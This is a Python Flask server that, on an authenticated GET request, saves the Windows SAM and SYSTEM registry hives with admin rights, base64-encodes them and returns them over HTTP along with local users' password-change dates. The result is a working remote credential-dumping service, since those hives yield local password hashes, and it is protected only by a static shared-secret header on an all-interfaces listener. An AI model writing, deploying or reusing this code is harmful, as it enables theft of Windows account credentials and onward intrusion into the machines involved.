import os
import subprocess
import ctypes
import random
import string
import base64
import json
from flask import Flask, request, jsonify
from dotenv import load_dotenv

load_dotenv()

SECRET = os.getenv("SECRET")
PORT = int(os.getenv("PORT", "8000"))

app = Flask(__name__)

def is_admin() -> bool:
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except AttributeError:
        return False

def run_as_admin(command: str) -> str:
    try:
        prefix = (
            "[Console]::OutputEncoding = New-Object System.Text.UTF8Encoding $false; "
            "$OutputEncoding = [Console]::OutputEncoding; "
        )
        full = prefix + command

        result = subprocess.run(
            ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", full],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            encoding="utf-8",
            errors="replace",
            check=False
        )
        if result.returncode != 0:
            raise RuntimeError(f"PowerShell error ({result.returncode}): {result.stderr.strip()}")
        return result.stdout
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")
    except Exception as e:
        print(f"Unexpected error: {e}")

def generate_random_string(length: int) -> str:
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))

def get_file_contents(file_name: str) -> str:
    with open(file_name, "rb") as f:
        raw_bytes = f.read()

    return base64.b64encode(raw_bytes).decode("ascii")

@app.route("/", methods=["GET"])
def main():
    header_secret = request.headers.get("X-SECRET")

    if header_secret is None:
        return jsonify({"success": False, "error": "Missing authentication header"}), 400

    if header_secret != SECRET:
        return jsonify({"success": False, "error": "Invalid secret"}), 403

    sam_file_name = generate_random_string(10) 
    system_file_name = generate_random_string(10)

    run_as_admin(f"reg save HKLM\SAM {sam_file_name}")
    run_as_admin(f"reg save HKLM\SYSTEM {system_file_name}")

    sam_contents = get_file_contents(sam_file_name)
    system_contents = get_file_contents(system_file_name)

    os.remove(sam_file_name)
    os.remove(system_file_name)

    ps_command = r"Get-LocalUser | Select-Object Name,@{Name='PasswordLastSet';Expression={if ($_.PasswordLastSet) { $_.PasswordLastSet.ToString('yyyy-MM-dd HH:mm:ss') } else { $null }}} | ConvertTo-Json"
    passwords_last_updated_output = json.loads(run_as_admin(ps_command))

    return jsonify({
        "success": True, 
        "sam": sam_contents, 
        "system": system_contents, 
        "last_password_updated_dates": passwords_last_updated_output
    })



if __name__ == "__main__":
    if not is_admin():
        raise PermissionError("You must run this application as an admin.")

    app.run(
        host="0.0.0.0", 
        port=PORT,      
        debug=False      
    )